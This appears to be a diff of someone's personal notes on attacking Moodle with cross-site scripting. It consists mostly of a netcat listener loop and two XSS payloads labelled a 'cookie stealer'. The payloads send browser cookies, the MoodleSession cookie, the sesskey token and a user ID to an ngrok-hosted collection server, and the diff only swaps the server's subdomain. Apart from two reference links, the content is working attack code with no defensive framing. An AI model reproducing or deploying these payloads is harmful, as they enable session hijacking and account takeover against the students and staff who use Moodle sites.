@@ -15,9 +15,9 @@ https://docs.moodle.org/dev/Security:Cross-site_scripting
 while true; do nc -l 9999; done
 
 My cookie stealer:
-<script>alert('xss');document.write('<img src="https://668da81e.ngrok.io/?cookie=' + document.cookie + '" />')</script>
+<script>alert('xss');document.write('<img src="https://7ea30092.ngrok.io/?cookie=' + document.cookie + '" />')</script>
 
-<script>document.write('<img src="https://5fc418e2.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "&sesskey=" + M.cfg.sesskey + "&id=" + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid") + '" />')</script>
+<script>document.write('<img src="https://7ea30092.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "&sesskey=" + M.cfg.sesskey + "&id=" + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid") + '" />')</script>
 
 https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.
 
